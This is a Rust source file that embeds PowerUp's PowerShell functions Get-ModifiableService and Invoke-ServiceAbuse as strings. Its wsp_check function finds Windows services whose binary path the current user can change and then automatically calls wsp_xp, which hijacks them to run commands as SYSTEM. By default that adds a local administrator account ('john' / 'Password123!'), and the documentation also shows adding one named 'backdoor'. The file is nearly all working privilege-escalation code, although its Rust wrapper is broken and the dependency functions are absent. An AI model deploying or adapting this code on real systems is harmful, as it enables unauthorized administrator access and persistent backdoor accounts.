use std::process::Command;

pub fn wsp_check() {
    let cmd: &str = wsp_xp_check;
    let mut command: String = cmd.to_owned();
    let cmd_addons: &str = "
    Get-ModifiableService
    ";
    command.push_str(cmd_addons);
    let out = Command::new(command).output().expect("failed to execute process");
    println!("Vulnerable: {}", String::from_utf8_lossy(&out.stdout));
    if String::from_utf8_lossy(&out.stdout).contains("True"){
        wsp_xp()
    }
}

fn wsp_xp(){
    let cmd: &str = wsp_xp_run;
    let mut command: String = cmd.to_owned();
    let cmd_addons: &str = "
    Invoke-ServiceAbuse
    ";
    command.push_str(cmd_addons);
    let out = Command::new(command).output().expect("failed to execute process");
    println!("{}", String::from_utf8_lossy(&out.stdout));
}

static wsp_xp_check: &'static str = "
function Get-ModifiableService {
    <#
    .SYNOPSIS
    
    Enumerates all services and returns services for which the current user can modify the binPath.
    
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: Test-ServiceDaclPermission, Get-ServiceDetail  
    
    .DESCRIPTION
    
    Enumerates all services using Get-Service and uses Test-ServiceDaclPermission to test if
    the current user has rights to change the service configuration.
    
    .EXAMPLE
    
    Get-ModifiableService
    
    Get a set of potentially exploitable services.
    
    .OUTPUTS
    
    PowerUp.ModifiablePath
    #>
    
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [OutputType('PowerUp.ModifiableService')]
        [CmdletBinding()]
        Param()
    
        Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
            $ServiceDetails = $_ | Get-ServiceDetail
            $CanRestart = $_ | Test-ServiceDaclPermission -PermissionSet 'Restart'
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.name
            $Out | Add-Member Noteproperty 'Path' $ServiceDetails.pathname
            $Out | Add-Member Noteproperty 'StartName' $ServiceDetails.startname
            $Out | Add-Member Noteproperty 'AbuseFunction' \"Invoke-ServiceAbuse -Name '$($ServiceDetails.name)'\"
            $Out | Add-Member Noteproperty 'CanRestart' ([Bool]$CanRestart)
            $Out | Add-Member Aliasproperty Name ServiceName
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableService')
            $Out
        }
    }
";

static wsp_xp_run: &'static str = "
function Invoke-ServiceAbuse {
    <#
    .SYNOPSIS
    
    Abuses a function the current user has configuration rights on in order
    to add a local administrator or execute a custom command.
    
    Author: Will Schroeder (@harmj0y)  
    License: BSD 3-Clause  
    Required Dependencies: Get-ServiceDetail, Set-ServiceBinaryPath  
    
    .DESCRIPTION
    
    Takes a service Name or a ServiceProcess.ServiceController on the pipeline that the current
    user has configuration modification rights on and executes a series of automated actions to
    execute commands as SYSTEM. First, the service is enabled if it was set as disabled and the
    original service binary path and configuration state are preserved. Then the service is stopped
    and the Set-ServiceBinaryPath function is used to set the binary (binPath) for the service to a
    series of commands, the service is started, stopped, and the next command is configured. After
    completion, the original service configuration is restored and a custom object is returned
    that captures the service abused and commands run.
    
    .PARAMETER Name
    
    An array of one or more service names to abuse.
    
    .PARAMETER UserName
    
    The [domain\\]username to add. If not given, it defaults to \"john\".
    Domain users are not created, only added to the specified localgroup.
    
    .PARAMETER Password
    
    The password to set for the added user. If not given, it defaults to \"Password123!\"
    
    .PARAMETER LocalGroup
    
    Local group name to add the user to (default of 'Administrators').
    
    .PARAMETER Credential
    
    A [Management.Automation.PSCredential] object specifying the user/password to add.
    
    .PARAMETER Command
    
    Custom command to execute instead of user creation.
    
    .PARAMETER Force
    
    Switch. Force service stopping, even if other services are dependent.
    
    .EXAMPLE
    
    Invoke-ServiceAbuse -Name VulnSVC
    
    Abuses service 'VulnSVC' to add a localuser \"john\" with password
    \"Password123! to the  machine and local administrator group
    
    .EXAMPLE
    
    Get-Service VulnSVC | Invoke-ServiceAbuse
    
    Abuses service 'VulnSVC' to add a localuser \"john\" with password
    \"Password123! to the  machine and local administrator group
    
    .EXAMPLE
    
    Invoke-ServiceAbuse -Name VulnSVC -UserName \"TESTLAB\\john\"
    
    Abuses service 'VulnSVC' to add a the domain user TESTLAB\\john to the
    local adminisrtators group.
    
    .EXAMPLE
    
    Invoke-ServiceAbuse -Name VulnSVC -UserName backdoor -Password password -LocalGroup \"Power Users\"
    
    Abuses service 'VulnSVC' to add a localuser \"backdoor\" with password
    \"password\" to the  machine and local \"Power Users\" group
    
    .EXAMPLE
    
    Invoke-ServiceAbuse -Name VulnSVC -Command \"net ...\"
    
    Abuses service 'VulnSVC' to execute a custom command.
    
    .OUTPUTS
    
    PowerUp.AbusedService
    #>
    
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [OutputType('PowerUp.AbusedService')]
        [CmdletBinding()]
        Param(
            [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
            [Alias('ServiceName')]
            [String[]]
            [ValidateNotNullOrEmpty()]
            $Name,
    
            [ValidateNotNullOrEmpty()]
            [String]
            $UserName = 'john',
    
            [ValidateNotNullOrEmpty()]
            [String]
            $Password = 'Password123!',
    
            [ValidateNotNullOrEmpty()]
            [String]
            $LocalGroup = 'Administrators',
    
            [Management.Automation.PSCredential]
            [Management.Automation.CredentialAttribute()]
            $Credential = [Management.Automation.PSCredential]::Empty,
    
            [String]
            [ValidateNotNullOrEmpty()]
            $Command,
    
            [Switch]
            $Force
        )
    
        BEGIN {
    
            if ($PSBoundParameters['Command']) {
                $ServiceCommands = @($Command)
            }
    
            else {
                if ($PSBoundParameters['Credential']) {
                    $UserNameToAdd = $Credential.UserName
                    $PasswordToAdd = $Credential.GetNetworkCredential().Password
                }
                else {
                    $UserNameToAdd = $UserName
                    $PasswordToAdd = $Password
                }
    
                if ($UserNameToAdd.Contains('\')) {
                    # only adding a domain user to the local group, no user creation
                    $ServiceCommands = @(\"net localgroup $LocalGroup $UserNameToAdd /add\")
                }
                else {
                    # create a local user and add it to the local specified group
                    $ServiceCommands = @(\"net user $UserNameToAdd $PasswordToAdd /add\", \"net localgroup $LocalGroup $UserNameToAdd /add\")
                }
            }
        }
    
        PROCESS {
    
            ForEach($IndividualService in $Name) {
    
                $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
                $ServiceDetails = $TargetService | Get-ServiceDetail
    
                $RestoreDisabled = $False
                if ($ServiceDetails.StartMode -match 'Disabled') {
                    Write-Verbose \"Service '$(ServiceDetails.Name)' disabled, enabling...\"
                    $TargetService | Set-Service -StartupType Manual -ErrorAction Stop
                    $RestoreDisabled = $True
                }
    
                $OriginalServicePath = $ServiceDetails.PathName
                $OriginalServiceState = $ServiceDetails.State
    
                Write-Verbose \"Service '$($TargetService.Name)' original path: '$OriginalServicePath'\"
                Write-Verbose \"Service '$($TargetService.Name)' original state: '$OriginalServiceState'\"
    
                ForEach($ServiceCommand in $ServiceCommands) {
    
                    if ($PSBoundParameters['Force']) {
                        $TargetService | Stop-Service -Force -ErrorAction Stop
                    }
                    else {
                        $TargetService | Stop-Service -ErrorAction Stop
                    }
    
                    Write-Verbose \"Executing command '$ServiceCommand'\"
                    $Success = $TargetService | Set-ServiceBinaryPath -Path \"$ServiceCommand\"
    
                    if (-not $Success) {
                        throw \"Error reconfiguring the binary path for $($TargetService.Name)\"
                    }
    
                    $TargetService | Start-Service -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 2
                }
    
                if ($PSBoundParameters['Force']) {
                    $TargetService | Stop-Service -Force -ErrorAction Stop
                }
                else {
                    $TargetService | Stop-Service -ErrorAction Stop
                }
    
                Write-Verbose \"Restoring original path to service '$($TargetService.Name)'\"
                Start-Sleep -Seconds 1
                $Success = $TargetService | Set-ServiceBinaryPath -Path \"$OriginalServicePath\"
    
                if (-not $Success) {
                    throw \"Error restoring the original binPath for $($TargetService.Name)\"
                }
    
                # try to restore the service to whatever the service's original state was
                if ($RestoreDisabled) {
                    Write-Verbose \"Re-disabling service '$($TargetService.Name)'\"
                    $TargetService | Set-Service -StartupType Disabled -ErrorAction Stop
                }
                elseif ($OriginalServiceState -eq \"Paused\") {
                    Write-Verbose \"Starting and then pausing service '$($TargetService.Name)'\"
                    $TargetService | Start-Service
                    Start-Sleep -Seconds 1
                    $TargetService | Set-Service -Status Paused -ErrorAction Stop
                }
                elseif ($OriginalServiceState -eq \"Stopped\") {
                    Write-Verbose \"Leaving service '$($TargetService.Name)' in stopped state\"
                }
                else {
                    Write-Verbose \"Restarting '$($TargetService.Name)'\"
                    $TargetService | Start-Service
                }
    
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'ServiceAbused' $TargetService.Name
                $Out | Add-Member Noteproperty 'Command' $($ServiceCommands -join ' && ')
                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.AbusedService')
                $Out
            }
        }
    }
    
";